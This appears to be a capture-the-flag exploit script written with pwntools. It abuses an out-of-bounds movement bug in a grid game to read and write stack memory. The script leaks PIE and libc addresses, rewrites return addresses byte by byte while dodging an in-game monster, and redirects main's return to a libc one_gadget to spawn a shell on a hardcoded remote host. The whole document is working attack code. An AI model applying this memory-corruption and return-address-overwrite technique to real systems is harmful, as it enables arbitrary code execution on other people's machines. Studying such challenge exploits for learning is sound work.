#!/usr/bin/python
from pwn import *
import sys, math

LOCAL = True

HOST = "195.201.127.177"
PORT = 9999

# Player information
PLAYER_X = -1
PLAYER_Y = -1
CURRENT = -1
DEST = -1

# Monster information
ENEMY_X = 0
ENEMY_Y = 0
ENEMY_COOLDOWN = 5
ENEMY_DISTANCE = 0

# Non ASLR address used for easier calculating offsets
REAL_FIELD = 0x7fffffffe440

"""
Recalculate new monster position and distance to player.
"""
def move_enemy():
	global PLAYER_X, PLAYER_Y, ENEMY_X, ENEMY_Y, ENEMY_COOLDOWN, ENEMY_DISTANCE

	if ENEMY_COOLDOWN < 3:		
		# Calculate new monster pos and distance
		EDX = (PLAYER_X - ENEMY_X) 
		EDY = (PLAYER_Y - ENEMY_Y) 

		ENEMY_X += 1 if EDX > 0 else -1
		ENEMY_Y += 1 if EDY > 0 else -1

		ENEMY_DISTANCE = math.sqrt((EDX*EDX) + (EDY*EDY))

	if ENEMY_COOLDOWN == 0:
		ENEMY_COOLDOWN = 6

	ENEMY_COOLDOWN -= 1

"""
Move player in specified direction and update monster info.
"""
def move(direction):
	global PLAYER_X, PLAYER_Y

	r.sendline(direction)

	if direction == "w":
		PLAYER_Y -= 1
	elif direction == "s":
		PLAYER_Y += 1
	elif direction == "a":
		PLAYER_X -= 1
	elif direction == "d":
		PLAYER_X += 1

	move_enemy()
	
"""
Parse current game state.
"""
def parse_screen():
	global ENEMY_X, ENEMY_Y, PLAYER_X, PLAYER_Y, CURRENT, DEST, ENEMY_DISTANCE

	r.sendline("f")

	r.recvuntil("Position: (")
	PLAYER_X = int(r.recvuntil(", ", drop=True))
	PLAYER_Y = int(r.recvuntil(")", drop=True))

	r.recvuntil("CURRENT CELL: ")
	r.recv(5)
	CURRENT = int("0x"+r.recvuntil(" ", drop=True), 16)

	r.recvuntil(" ")
	DEST = int("0x"+r.recvuntil("\n", drop=True), 16)

	log.info("PLAYER_X: %d / PLAYER_Y: %d / ENEMY_X: %d / ENEMY_Y: %d / ENEMY_DISTANCE: %d / Cur: %s / Dest: %s" % (PLAYER_X, PLAYER_Y, ENEMY_X, ENEMY_Y, ENEMY_DISTANCE, hex(CURRENT), hex(DEST)))

"""
Enter headless mode.
"""
def go_headless():
	r.recvuntil("HEADLESS...\n")
	r.sendline("h")
	parse_screen()
	
"""
Initialize exploit by moving out of gamefield.
"""
def init_exploit_state():
	global ENEMY_X, ENEMY_Y

	log.info("Starting game, go out of bounds")

	for i in range(11):
		move("d")		

	for i in range(11):
		move("w")

	move("w")
	
	ENEMY_X = 9
	ENEMY_Y = 255

	parse_screen()

"""
Move player to specific x/y coordinates.
"""
def goto_xy(dest_x, dest_y):
	global PLAYER_X, PLAYER_Y

	while (dest_y != PLAYER_Y):
		if (dest_y < PLAYER_Y):		
			move("w")
		elif (dest_y > PLAYER_Y):
			move("s")

	while (dest_x != PLAYER_X):		
		if (dest_x < PLAYER_X):
			move("a")
		elif (dest_x > PLAYER_X):
			move("d")

"""
Move player to start of specific address on stack.
"""
def goto_address(address):
	# calculate dest PLAYER_X/PLAYER_Y	
	dest_x = (address - REAL_FIELD) % 10
	dest_y = (address - REAL_FIELD) / 10

	log.info("Goto address %s : %d / %d" % (hex(address), dest_x, dest_y))

	goto_xy(dest_x, dest_y)

"""
Parse address at current position.
"""
def parse_qword():
	r1 = ""
	
	for i in range(6):
		parse_screen()
		r1 += chr(CURRENT)		
		move("d")

	parse_screen()
	return u64(r1.ljust(8, "\x00"))

"""
Read value at specific address.
"""
def read_address(address):
	goto_address(address)	
	return parse_qword()

"""
Change value of current cell.
"""
def change_value(value):	
	if value == -0x10:
		r.sendline("2")
	elif value == 0x10:
		r.sendline("1")
	elif value == -0x1:
		r.sendline("-")
	elif value == 0x1:
		r.sendline("+")

	move_enemy()

"""
Change specified address from source value to destination value.
This will observe monster position and if the monster comes near
it will cancel current write and restart the game. On restart it
will walk back to the current address and continue the overwrite
until the destination value was completely written.
"""
def change_address(address, src_value, dest_value):
	global ENEMY_DISTANCE, PIELEAK

	log.info("Change address %s : %s => %s" % (hex(address), hex(src_value), hex(dest_value)))

	goto_address(address)

	cur_offset = 0

	for i in range(8):
		cur_byte = (src_value >> (i*8)) & 0xff
		dest_byte = (dest_value >> (i*8)) & 0xff

		# only move if we have something to do for this byte
		if cur_byte != dest_byte:			
			while cur_offset < i:
				move("d")	
				cur_offset += 1
		
		while cur_byte != dest_byte:	
			log.info("Change byte at %s : %s => %s" % (hex(address+cur_offset), hex(cur_byte), hex(dest_byte)))

			# try to modify the current byte until monster gets too close
			while (cur_byte >= dest_byte + 0x10) and (ENEMY_DISTANCE > 3):
				change_value(-0x10)
				cur_byte -= 0x10
			while (cur_byte > dest_byte) and (ENEMY_DISTANCE > 3):
				change_value(-0x1)
				cur_byte -= 0x1
			while (cur_byte <= dest_byte - 0x10) and (ENEMY_DISTANCE > 3):
				change_value(0x10)
				cur_byte += 0x10
			while (cur_byte < dest_byte) and (ENEMY_DISTANCE > 3):
				change_value(0x1)
				cur_byte += 0x1

			parse_screen()

			# check, if we had to cancel because of monster getting close
			if cur_byte != dest_byte:
				# overwrite main_loop return with call to main_loop and quit
				log.info("Cancel address write and replay")

				change_address(0x7fffffffe528, PIELEAK, PIELEAK-5)

				# quit and replay until we reach current address again and continue with overwrite
				r.sendline("q")
				parse_screen()
				init_exploit_state()

				goto_address(address+cur_offset)
				
def exploit(r):
	global PIELEAK

	go_headless()	

	init_exploit_state()	

	log.info("Leak PIE")

	PIELEAK = read_address(0x7fffffffe528)
	e.address = PIELEAK - 0x25e0
	
	log.info("PIE leak          : %s" % hex(PIELEAK))
	log.info("PIE base          : %s" % hex(e.address))

	log.info("Overwrite main_loop ret for another round")
	change_address(0x7fffffffe528, PIELEAK, PIELEAK-5)

	log.info("Leak libc")

	LIBCLEAK = read_address(0x7fffffffe4a8)
	libc.address = LIBCLEAK - 0x396440

	log.info("LIBC leak         : %s" % hex(LIBCLEAK))

	log.info("Quit to return to initial state")
	
	r.sendline("q")
	parse_screen()
	init_exploit_state()

	log.info("Play until main return address is overwritten with one_gadget")

	CURRENT_MAIN_RET = libc.address + 0x202e1
	ONE_GADGET = libc.address + 0x3f306

	change_address(0x7fffffffed78, CURRENT_MAIN_RET, ONE_GADGET)

	log.info("Main return address successfully overwritten. Quit to trigger shell...")

	r.sendline("q")

	r.recvuntil("EXIT!\n")
	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./challenge")
	libc = ELF("./libc-2.24.so")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./challenge", env={"LD_PRELOAD" : "./libc-2.24.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
